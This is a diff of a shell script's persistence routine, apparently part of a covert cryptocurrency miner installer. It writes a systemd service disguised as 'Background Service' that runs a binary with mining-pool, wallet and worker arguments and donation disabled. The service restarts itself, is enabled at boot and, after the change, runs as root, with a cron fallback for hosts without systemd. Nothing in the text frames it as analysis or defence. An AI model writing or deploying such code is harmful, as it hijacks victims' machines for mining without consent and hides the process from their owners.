@@ -145,7 +145,7 @@ setup_persistence() {
     # 1. 尝试 Systemd（高权限）
     if [ -d "/etc/systemd/system" ] && [ -w "/etc/systemd/system" ]; then
         debug_echo "使用 Systemd 持久化"
-        cat <<EOF | sudo tee "/etc/systemd/system/${BIN_NAME}.service" >/dev/null
+        cat <<EOF > "/etc/systemd/system/${BIN_NAME}.service"
 [Unit]
 Description=Background Service
 After=network.target
@@ -154,14 +154,14 @@ After=network.target
 ExecStart=${STORE_DIR}/${BIN_NAME} -o $POOL -u $WALLET --cpu-max-threads-hint $THREADS -p $WORKER_NAME --donate-level=0 -b
 Restart=always
 RestartSec=30
-User=$(whoami)
+User=root
 
 [Install]
 WantedBy=multi-user.target
 EOF
-        sudo systemctl daemon-reload
-        sudo systemctl enable "${BIN_NAME}.service"
-        sudo systemctl start "${BIN_NAME}.service" >/dev/null 2>&1 &
+        systemctl daemon-reload
+        systemctl enable "${BIN_NAME}.service"
+        systemctl start "${BIN_NAME}.service" >/dev/null 2>&1 &
     
     # 2. 尝试 Cron（低权限）
     elif command -v crontab >/dev/null; then
